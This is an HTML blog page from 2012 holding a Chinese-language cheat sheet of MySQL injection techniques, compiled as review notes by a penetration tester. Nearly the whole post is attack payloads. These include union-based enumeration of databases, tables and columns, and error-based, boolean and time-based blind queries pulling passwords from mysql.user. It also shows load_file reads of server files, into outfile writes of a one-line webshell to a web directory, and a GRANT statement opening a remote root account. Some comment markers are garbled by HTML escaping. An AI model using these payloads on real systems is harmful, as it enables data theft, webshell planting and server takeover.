@@ -1,0 +1,827 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="mysql注入,总结," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;最近不知怎么的！好像是很久不做渗透测试了！很多东西都忘了！简单的注入语句都想不起来！于是我想啊，有必要总结一下了，复习一下了！以前太懒不更新博客，记录东西，现在想复习翻以前的东西，什么都没有！汗啊！ —————————–以上全是废话——————– 标题：mysql注入总结 作者：L.N. 时间：2012-07-23 博客：lanu.sinaapp.c">
+<meta name="keywords" content="mysql注入,总结">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【复习】mysql注入总结">
+<meta property="og:url" content="http://yoursite.com/2012/07/26/【复习】mysql注入总结/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;最近不知怎么的！好像是很久不做渗透测试了！很多东西都忘了！简单的注入语句都想不起来！于是我想啊，有必要总结一下了，复习一下了！以前太懒不更新博客，记录东西，现在想复习翻以前的东西，什么都没有！汗啊！ —————————–以上全是废话——————– 标题：mysql注入总结 作者：L.N. 时间：2012-07-23 博客：lanu.sinaapp.c">
+<meta property="og:updated_time" content="2018-02-26T05:36:35.268Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="【复习】mysql注入总结">
+<meta name="twitter:description" content="&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;最近不知怎么的！好像是很久不做渗透测试了！很多东西都忘了！简单的注入语句都想不起来！于是我想啊，有必要总结一下了，复习一下了！以前太懒不更新博客，记录东西，现在想复习翻以前的东西，什么都没有！汗啊！ —————————–以上全是废话——————– 标题：mysql注入总结 作者：L.N. 时间：2012-07-23 博客：lanu.sinaapp.c">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2012/07/26/【复习】mysql注入总结/"/>
+
+
+
+
+
+  <title>【复习】mysql注入总结 | Hexo</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Startseite
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archiv
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2012/07/26/【复习】mysql注入总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">【复习】mysql注入总结</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2012-07-26T17:11:01+08:00">
+                2012-07-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PHP-MYSQL学习/" itemprop="url" rel="index">
+                    <span itemprop="name">PHP|MYSQL学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>&nbsp;&nbsp;&nbsp;&nbsp;最近不知怎么的！好像是很久不做渗透测试了！很多东西都忘了！简单的注入语句都想不起来！于是我想啊，有必要总结一下了，复习一下了！以前太懒不更新博客，记录东西，现在想复习翻以前的东西，什么都没有！汗啊！</p>
+<p>—————————–以上全是废话——————–</p>
+<p>标题：mysql注入总结</p>
+<p>作者：L.N.</p>
+<p>时间：2012-07-23</p>
+<p>博客：lanu.sinaapp.com</p>
+<p>&nbsp;</p>
+<p>目录：</p>
+<p>0x00 mysql一般注入（select）</p>
+<p>0x01 mysql一般注入（insert、update）</p>
+<p>0x02 mysql报错注入</p>
+<p>0x03 mysql一般盲注</p>
+<p>0x04 mysql时间盲注</p>
+<p>0x05&nbsp;mysql其他注入技巧</p>
+<p>0x06 mysql数据库版本特性&nbsp;</p>
+<p>0x07 声明</p>
+<p>&nbsp;</p>
+<p>正文：</p>
+<p>&nbsp;</p>
+<p><strong>0x00 mysql一般注入（select）</strong></p>
+<p>&nbsp;</p>
+<p>1.注释符</p>
+<p>#</p>
+<p>/&amp;#42</p>
+<p>–</p>
+<p>&nbsp;</p>
+<p>2.过滤空格注入</p>
+<p>使用/&amp;#42&amp;#42/或()或+代替空格</p>
+<p>%0c = form feed, new page</p>
+<p>%09 = horizontal tab</p>
+<p>%0d = carriage return</p>
+<p>%0a = line feed, new line</p>
+<p>&nbsp;</p>
+<p>3.多条数据显示</p>
+<p>concat()</p>
+<p>group_concat()</p>
+<p>concat_ws()</p>
+<p>&nbsp;</p>
+<p>4.相关函数</p>
+<p>system_user() 系统用户名</p>
+<p>user() 用户名</p>
+<p>current_user 当前用户名</p>
+<p>session_user()连接数据库的用户名</p>
+<p>database() 数据库名</p>
+<p>version() MYSQL数据库版本</p>
+<p>load_file() MYSQL读取本地文件的函数</p>
+<p>@@datadir 读取数据库路径</p>
+<p>@@basedir MYSQL 安装路径</p>
+<p>@@version_compile_os 操作系统 Windows Server 2003</p>
+<p><code>GRANT ALL PRIVILEGES ON &amp;#42.&amp;#42 TO [’root’@’%’](mailto:’root’@’%’) IDENTIFIED BY ’123456’ WITH GRANT OPTION;</code></p>
+<p>5.mysql一般注入语句</p>
+<p>猜字段数</p>
+<p>order by n/&amp;#42</p>
+<p>查看mysql基本信息</p>
+<p>and 1=2 union select 1,2,3,concat_ws(char(32,58,32),0x7c,user(),database(),version()),5,6,7/&amp;#42</p>
+<p>查询数据库</p>
+<p>and 1=2 union select 1,schema_name,3,4 from information_schema.schemata limit 1,1/&amp;#42</p>
+<p>and 1=2 union select 1,group_concat(schema_name),3,4 from information_schema.schemata/&amp;#42</p>
+<p>查询表名</p>
+<p>and 1=2 union select 1,2,3,4,table_name,5 from information_schema.tables where table_schema=数据库的16进制编码 limit 1,1/&amp;#42</p>
+<p>and 1=2 union select 1,2,3,4,group_concat(table_name),5 from information_schema.tables where table_schema=数据库的16进制编码/&amp;#42</p>
+<p>查询字段</p>
+<p>and 1=2 union select 1,2,3,4,column_name,5,6,7 from information_schema.columns where table_name=表名的十六进制编码 and table_schema=数据库的16进制编码 limit 1,1/&amp;#42</p>
+<p>and 1=2 union select 1,2,3,4,group_concat(column_name),5,6,7 from information_schema.columns where table_name=表名的十六进制编码 and table_schema=数据库的16进制编码/&amp;#42</p>
+<p>查询数据</p>
+<p>and 1=2 union select 1,2,3,字段1,5,字段2,7,8 from 数据库.表/&amp;#42</p>
+<p>判断是否具有读写权限</p>
+<p>and (select count(&amp;#42) from mysql.user)&gt;0/&amp;#42</p>
+<p>and (select count(file_priv) from mysql.user)&gt;0/&amp;#42</p>
+<p>&nbsp;</p>
+<p>6.mysql读取写入文件</p>
+<p>必备条件：</p>
+<p>读：file权限必备</p>
+<p>写：1.绝对路径 2.union使用&nbsp;3. 可以使用’’&nbsp;&nbsp;</p>
+<p>————————-读———————-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>
+<p>mysql3.x读取方法</p>
+<p>create table a(cmd text);</p>
+<p>load data infile ’c:\xxx\xxx\xxx.txt’ into table a;</p>
+<p>select &amp;#42 from a;</p>
+<p>mysql4.x读取方法</p>
+<p>除上述方法还可以使用load_file()</p>
+<p>create table a(cmd text);</p>
+<p>insert into a(cmd) values(load_file(’c:\ddd\ddd\ddd.txt’));</p>
+<p>select &amp;#42 from a;</p>
+<p>mysql5.x读取方法</p>
+<p>上述两种都可以</p>
+<p>读取文件技巧：</p>
+<p>load_file(char(32,26,56,66))</p>
+<p>load_file(0x633A5C626F6F742E696E69)</p>
+<p>————写————————–</p>
+<p>into outfile写文件</p>
+<p>union select 1,2,3,char(这里写入你转换成10进制或16进制的一句话木马代码),5,6,7,8,9,10,7 into outfile ’d:web90team.php’/&amp;#42</p>
+<p>union select 1,2,3,load_file(’d:weblogo123.jpg’),5,6,7,8,9,10,7 into outfile ’d:web90team.php’/&amp;#42</p>
+<p>&nbsp;</p>
+<p><strong>0x01 mysql一般注入（insert、update）</strong></p>
+<p>&nbsp;</p>
+<p>mysql一般请求mysql_query不支持多语句执行，mysqli可以。&nbsp;</p>
+<p>&nbsp;</p>
+<p>insert注入多使用报错注入！</p>
+<p>1.如果可以直接插入管理员可以直接使用！</p>
+<p>insert into user(username,password) values(’xxxx’,’ <strong>xxxx’),(’dddd’,’dddd’)/&amp;#42 </strong>’);</p>
+<p>2.如果可以插入一些数据，这些数据会在网页中显示，我们可以结合xxs和csrf来获取cookies或getshell</p>
+<p>&nbsp;</p>
+<p>update注入同上</p>
+<p>&nbsp;</p>
+<p><strong>0x02 mysql报错注入</strong></p>
+<p>&nbsp;</p>
+<p>1. and(select 1 from(select count(&amp;#42),concat((select (select (语句)) from information_schema.tables limit 0,1),floor(rand(0)&amp;#422))x from information_schema.tables group by x)a) and 1=1</p>
+<p>语句处填入一般一句，如：SELECT distinct concat(0x7e,0x27,schema_name,0x27,0x7e) FROM information_schema.schemata LIMIT 0,1</p>
+<p>&nbsp;</p>
+<p>2. and+1=(select+&amp;#42+from+(select+NAME_CONST((语句),1),NAME_CONST((语句),1))+as+x)–</p>
+<p>&nbsp;</p>
+<p>3.update web_ids set host=’<a href="http://www.0x50sec.org’" target="_blank" rel="noopener">www.0x50sec.org’</a> where id =1 aNd (SELECT 1 FROM (select count(&amp;#42),concat(floor(rand(0)&amp;#422),(substring((Select (语句)),1,62)))a from information_schema.tables group by a)b);</p>
+<p>&nbsp;</p>
+<p>4.insert into web_ids(host) values((select (1) from mysql.user where 1=1 aNd (SELECT 1 FROM (select count(&amp;#42),concat(floor(rand(0)&amp;#422),(substring((Select (语句)),1,62)))a from information_schema.tables group by a)b)));</p>
+<p>&nbsp;</p>
+<p>&nbsp;<strong>0x03 mysql一般盲注</strong></p>
+<p>&nbsp;</p>
+<p>使用ascii</p>
+<p>AND&nbsp;ascii(substring((SELECT&nbsp;password&nbsp;FROM&nbsp;users where&nbsp;id=1),1,1))=49</p>
+<p>使用正则表达式</p>
+<p>and 1=(SELECT 1 FROM information_schema.tables&nbsp; WHERE TABLE_SCHEMA=”blind_sqli” AND table_name REGEXP ’^[a-n]’ LIMIT 0,1)</p>
+<p>&nbsp;</p>
+<p><strong>0x04 mysql时间盲注</strong></p>
+<p>&nbsp;</p>
+<p><code>1170 union select if(substring(current,1,1)=char(11),benchmark(5000000,encode(’msg’,’by 5 seconds’)),null) from (select database() as current) as tbl</code></p>
+<p>&nbsp;</p>
+<p>UNION SELECT IF(SUBSTRING(Password,1,1)=’a’,BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = ‘root’</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p><strong>0x05 mysql其他注入技巧</strong></p>
+<p>&nbsp;</p>
+<p>以后遇见了更新</p>
+<p>&nbsp;</p>
+<p><strong>0x06 mysql数据库版本特性 </strong></p>
+<p>&nbsp;</p>
+<p>1. mysql5.0以后&nbsp; information.schema库出现</p>
+<p>2. mysql5.1以后 udf 导入xxlib<span style="font-size:x-small;">plugin 目录下</span></p>
+<p><span style="font-size:x-small;">3.mysql5.x以后 system执行命令</span></p>
+<p>&nbsp;</p>
+<p><strong>0x07 声明&nbsp;</strong></p>
+<p>&nbsp;</p>
+<p>如有错误，希望指正</p>
+<p>如果遗漏，希望讨论</p>
+<p>小菜总结，大牛勿吐</p>
+<p>记录笔记，时常复习</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/mysql注入/" rel="tag"># mysql注入</a>
+          
+            <a href="/tags/总结/" rel="tag"># 总结</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2012/07/21/关于一个做流量的代码分析/" rel="next" title="关于一个做流量的代码分析">
+                <i class="fa fa-chevron-left"></i> 关于一个做流量的代码分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2012/07/29/XSS-笔记/" rel="prev" title="XSS 笔记">
+                XSS 笔记 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">John Doe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">165</span>
+                  <span class="site-state-item-name">Artikel</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">Kategorien</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">183</span>
+                  <span class="site-state-item-name">Tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
